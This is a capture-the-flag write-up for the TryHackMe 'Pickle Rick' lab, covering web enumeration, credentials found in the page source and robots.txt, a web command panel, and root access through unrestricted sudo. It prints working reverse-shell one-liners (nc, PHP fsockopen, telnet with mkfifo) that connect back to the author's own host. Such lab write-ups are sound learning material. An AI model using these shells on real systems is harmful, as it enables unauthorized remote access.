# TryHackMe: Pickle Rick CTF

Notes/writeup for the THM CTF machine titled "Pickle Rick."

This is a fun machine that focuses on enumeration and investigation, reverse shells, and the linux file system.

* * *

## Enumeration

After starting the machine, I immediately ran a few different processes to gain a basic understanding of the machine and services.

The initial results were:

```
dirb:
	/assets/

nmap:
	port 22: OpenSSH
	port 80: Apache on Ubuntu
		System:
		Apache/2.4.18 (Ubuntu) Server at 10.10.139.155 		Port 80 
```

Main/Front Webpage:
![Front page](/cd_image_dir/front_page.png)


Source Code:
```
Note to self, remember username!

Username: R1ckRul3s
```

```
- username is embedded in the html code
- The text references "BURP" twice; At this point, I'm not sure if this is a reference to the show, or a hint that Burp Suite will be useful. 
```

With that said, I decided to open Burp and saw that the images being used were contained within a directory called /assets which is accessible.

	GET /assets/rickandmorty.jpeg
	/assets/ 

/assets contains photos and js files - I thought that perhaps the images contain something interesting. I ran stegseek while the nmap and dirb processes were finishing up, however nothing unusual was found in the photos 

    robots.txt: Wubbalubbadubdub 

I appended the string from robots.txt at the end of the URL as well as a subdirectory of /assets/ but nothing found. This will likely be useful at some point, however.


As seen above, the initial enumeration of the website did not return anything useful. I executed further enumeration with gobuster, and widened the scope to include various file extensions.

```
 gobuster -u http://10.10.139.155/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,sh,txt,cgi,html -t 15
 
 Gobuster:
 /login.php 
```
This revealed a login page, which is likely the key to gaining a foothold on the system. 

With that discovery, a fair amount of progress has been made:

```
Known:
	- Username
	- Login page/a web form
	- a string, potentially a password 
```

With these discoveries, I attempted login for the user R1ckRul3s with the string found in robots.txt. Authentication was succesful and I was greeted with a command execution box.

* * *

## Foothold

The first commands I executed within the web terminal were:

```
id

ls -lah
```

As usual, we have a webshell with the www-data user, uid 33:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data) 
```

Immediately, the files output from ls, named below, stand out:

```
Sup3rS3cretPickl3Ingred.txt
clue.txt 
```

I attempted to run the cat command, however permission was denied, so we need to either find a way around this or find a privesc exploit.
Before moving on, however, I decided to try the strings command:

```bash
strings clue.txt
```

Fortunately, this does work. The file reads:

```
"Look around the file system for the other ingredient." 
```

```bash
strings Sup3rS3cretPickl3Ingred.txt
```

I then tried the strings command for the "Sup3rS3cretPickl3Ingred.txt" file and surely enough, it worked. We now have our first flag/ingredient.

At this point, everything within the current directory is exhausted, so it is clear that in order to find more clues/flags, we will have to move onto other areas, as the clue suggests. I attempted to cd into different common directories and ran pwd, which as expected, showed we are within the:

```
/var/www/html 
```

directory, however I was unable to change directories.

* * *

## Exploitation

In order to make further progress, a more useful reverse shell must be established. Two common ways of accomplishing this would be to either start a local python http server and wget the reverse shell, or to simply use php/bash/netcat one-liner and directly execute it via the limited command input we already have.

I decided to go with the direct execution method and tried the following:

```
cmd:"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.5.104 4443 >/tmp/f"
```

The same error was seen, "Command disabled."

I then decided to try using php commands, which I generated via revshells.com.

```
nc -lvnp <port>
```

```
php -r '$sock=fsockopen("IP",PORT);exec("/bin/bash <&3 >&3 2>&3");'
```

![failed connection](/tmp/.mount_JoplincQ5eHE/resources/app.asar/cs_img_dir/revshell_fail.png)

The command was clearly executed, as a connection was made with netcat, however it immediately closed and could not be accesed. While this specific command did not work, there is at least confirmation that the commands are running and that connections can be made.

I continued trying various different methods, including php cmd, php exec, nc, bash, etc., none of which worked, however I was able to succesfully establish a reverse shell using telnet, via the following command:

```
TF=$(mktemp -u);mkfifo $TF && telnet 10.13.5.104 4443 0<$TF | /bin/bash 1>$TF
```

First, I tried some broad searches to see if anything immediately stuck out:

```
locate *.txt
locate *.sh
```

I did not see anything particularly interesting, so I navigated to /home and found a directory called "rick."

Inside of rick was a file called "second ingredients" and executing the cat command succesfully returned the second ingredient.

```
cd /home
cd /rick
ls --> second ingredients
cat * --> flag
```

Now, only one flag/ingredient is left. Given past experience with similar CTF machines, I thought it likely that this last flag would require elevated permissions to access. After attempting to cd into /root, it is clear that the current privilege level does not allow for movement within the root directory despite the machine not displaying any errors via the terminal.

I ran the following commands as a preliminary search for any potential methods of access or vulnerabilties:

```
find . -perm /4000

sudo -l
```

- While I could have easily set up a python http server and simply run linenum, I wanted to try to avoid doing that and instead improve my ability to manually search for any exploits, misconfigurations, and general methods of accessing privileged files or processes.

Interestingly, sudo -l returned "ALL." This came as a surprise, so instead of continuing to search for privesc exploits, I instead tried:

```
sudo ls /root/
```

Surely enough, this did return the contents of /root, including what appears to be the third and final flag.

Next, I tried:

```
sudo cat /root/3rd.txt 
sudo strings /root/3rd.txt
```

However, these did not return anything. I tried one more command:

```
sudo vi /root/3rd.txt
```

and, the third flag was returned!